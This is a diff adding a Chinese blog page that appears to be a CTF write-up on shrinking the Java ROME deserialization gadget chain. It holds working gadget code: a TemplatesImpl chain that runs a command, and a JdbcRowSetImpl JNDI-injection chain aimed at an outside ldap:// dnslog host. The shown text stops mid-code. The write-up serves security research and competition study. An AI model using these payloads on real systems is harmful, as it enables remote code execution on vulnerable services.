@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Java反序列化-ROME链的长度缩减 - Even - A super concise theme for Hugo</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="" /><meta name="description" content="原ROME 在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 Rome ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.101.0 with theme even" />
+
+
+<link rel="canonical" href="http://localhost:1313/post/shortenromelength/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b874a8796a492f0d7c86bb24c33cbf052935783a5778ebaf819a8e514bf49f10.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Java反序列化-ROME链的长度缩减" />
+<meta property="og:description" content="原ROME 在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 Rome ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/post/shortenromelength/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-03-11T11:05:16+08:00" />
+<meta property="article:modified_time" content="2022-03-11T11:05:16+08:00" />
+
+<meta itemprop="name" content="Java反序列化-ROME链的长度缩减">
+<meta itemprop="description" content="原ROME 在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 Rome ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内"><meta itemprop="datePublished" content="2022-03-11T11:05:16+08:00" />
+<meta itemprop="dateModified" content="2022-03-11T11:05:16+08:00" />
+<meta itemprop="wordCount" content="1282">
+<meta itemprop="keywords" content="Java安全," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Java反序列化-ROME链的长度缩减"/>
+<meta name="twitter:description" content="原ROME 在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 Rome ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Whoami</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Whoami</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Java反序列化-ROME链的长度缩减</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2022-03-11 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#原rome">原ROME</a></li>
+        <li><a href="#修改sink的尝试">修改Sink的尝试</a></li>
+        <li><a href="#新的source-">新的Source ✅</a></li>
+        <li><a href="#峰回路转">峰回路转</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="原rome">原ROME</h2>
+<p>在上周末的一场 CTF 中，有一道 Java 反序列化题目，环境的依赖是 <code>Rome</code> ，并且给了反序列化的接口，但是对 Base64 编码之后的序列化数据长度限制在 1956 的范围内。</p>
+<p>原 ROME 链这里不再分析，由于最后的触发点是我们的老朋友 <code>TemplatesImpl</code> ，所以最初的优化思路是参考 4rain 师傅的<a href="https://xz.aliyun.com/t/10824">这篇文章</a>对字节码进行优化，但是最后结果却不尽如人意，经过分析之后发现问题出在 <code>ObjectBean</code> 身上：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">ObjectBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Set</span> <span class="n">ignoreProperties</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">_equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">beanClass</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">_toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">beanClass</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">_cloneableBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CloneableBean</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">ignoreProperties</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造一个 <code>ObjectBean</code> ，实际上在其内部还会实例化三个对象，这是原链 payload 过长的根本原因。</p>
+<h2 id="修改sink的尝试">修改Sink的尝试</h2>
+<p>遗憾的是，在比赛的过程中我并没有意识到 ROME 链过长的根本原因是 <code>ObjectBean</code> 的问题，当时做的第一个尝试是修改原链的 sink 点，由于依靠的是触发类的 <code>getter</code> 方法，第一时间想到的是依靠 <code>JdbcRowSetImpl#getDatabaseMetaData</code> 完成 JNDI 注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">jdbcRowSet</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="s">&#34;ldap://1tqzc9.dnslog.cn/&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">jdbcRowSet</span><span class="o">.</span><span class="na">setMatchColumn</span><span class="o">(</span><span class="s">&#34;a&#34;</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是尝试过后依然超长，所以暂时搁置了这个想法，转而去寻找新的方式。</p>
+<h2 id="新的source-">新的Source ✅</h2>
+<p>原 ROME 链的之所以依靠调用getter方法完成RCE，是因为 <code>ToStringBean</code> 这一段核心的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">(</span><span class="n">String</span> <span class="n">prefix</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">pds</span> <span class="o">=</span> <span class="n">BeanIntrospector</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">pds</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">pName</span> <span class="o">=</span> <span class="n">pds</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Method</span> <span class="n">pReadMethod</span> <span class="o">=</span> <span class="n">pds</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReadMethod</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">pReadMethod</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">()</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">,</span> <span class="n">NO_PARAMS</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="o">.</span><span class="na">printProperty</span><span class="o">(</span><span class="n">sb</span><span class="o">,</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">&#34;.&#34;</span> <span class="o">+</span> <span class="n">pName</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(...)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码实际上会获取指定 <code>_beanClass</code> 的所有属性的 descriptor，然后获得其 getter 方法并依次调用，不过在 ROME 包下，类似的代码存在于很多类中，比如 <code>EqualsBean</code> ，在其 <code>beanEquals</code> 方法中也有类似的代码，而 <code>beanEquals</code> 方法会在 <code>equals</code> 方法中被调用。</p>
+<p>说到 <code>equals</code> 方法，可以借助 CC7 的思路，很多不允许元素的重复的集合类，都会调用对象的 <code>equals</code> 方法来检测对象是否相同，CC7中使用的 <code>HashTable</code> ，它本身是一个用于存放映射的数据结构，是 <code>HashMap</code> 线程安全级别的实现，其 <code>key</code> 自然不允许重复。所以借助CC7中的 hash 冲突这个 trick ，就可以组合出一条 Gadget ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ROME2</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Utils</span><span class="o">.</span><span class="na">createTemplates</span><span class="o">(</span><span class="s">&#34;open -a calculator.app&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">EqualsBean</span> <span class="n">equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">equalsBean</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">equalsBean</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// fix: Utils.setFieldValue(equalsBean, &#34;_beanClass&#34;, TemplatesImpl.class);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span> <span class="s">&#34;_beanClass&#34;</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span> <span class="s">&#34;_obj&#34;</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">unserialize</span><span class="o">(</span><span class="n">Utils</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">table</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这条链有个需要注意的地方是，两个 innerMap 的 key 和对应的 value 的值是相反的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># innerMap1
+</span></span><span class="line"><span class="cl"> - zZ --&gt; equlasBean
+</span></span><span class="line"><span class="cl"> - yy --&gt; templates
+</span></span><span class="line"><span class="cl"># innerMap2
+</span></span><span class="line"><span class="cl"> - zZ --&gt; templates
+</span></span><span class="line"><span class="cl"> - yy --&gt; equalsBean
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只有这样才能触发 gadget ，这与在 <code>HashTable</code> 反序列化时， <code>equlas</code> 方法的触发逻辑有关，大家调试一下便知。</p>
+<p>这条链payload编码之后的长度是1572，达到题目的要求绰绰有余。另外，这条链的 source 使用 <code>HashMap</code> 也是完全可以的，生成的长度甚至更短。</p>
+<h2 id="峰回路转">峰回路转</h2>
+<p>借助这个思路，在比赛结束之后，我尝试将组合的新链的 sink 改成 <code>JdbcRowSetImpl</code> ，测试其可行性，修改之后的长度是 2066，距离题目要求的 1956 还有微小的差距，分析之后，猜想可能是<code>JdbcRowSetImpl</code> 这个类太大了，它的方法数量太多，在字节码中占了很大一部分空间。不过虽然方法我们没法修改，但是是不是可以将一些没用的字段置为 <code>null</code> 呢？</p>
+<p>经过尝试之后，最后的长度在1884，勉强达到了要求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ROME_JNDI</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jdbcRowSet</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="s">&#34;ldap://1tqzc9.dnslog.cn/&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jdbcRowSet</span><span class="o">.</span><span class="na">setMatchColumn</span><span class="o">(</span><span class="s">&#34;a&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">clear</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">EqualsBean</span> <span class="n">equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">equalsBean</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">jdbcRowSet</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;zZ&#34;</span><span class="o">,</span> <span class="n">jdbcRowSet</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">innerMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;yy&#34;</span><span class="o">,</span> <span class="n">equalsBean</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Hashtable</span> <span class="n">table</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">table</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span> <span class="s">&#34;_beanClass&#34;</span><span class="o">,</span> <span class="n">JdbcRowSetImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span> <span class="s">&#34;_obj&#34;</span><span class="o">,</span> <span class="n">jdbcRowSet</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">Utils</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">table</span><span class="o">)).</span><span class="na">length</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//        Utils.unserialize(Utils.serialize(table));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="kt">void</span> <span class="nf">clear</span><span class="o">(</span><span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowSet</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="s">&#34;iMatchColumns&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Utils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="s">&#34;resBundle&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">BaseRowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">fee</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;listeners&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fee</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fee</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">jdbcRowSet</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fee</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;params&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fee</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
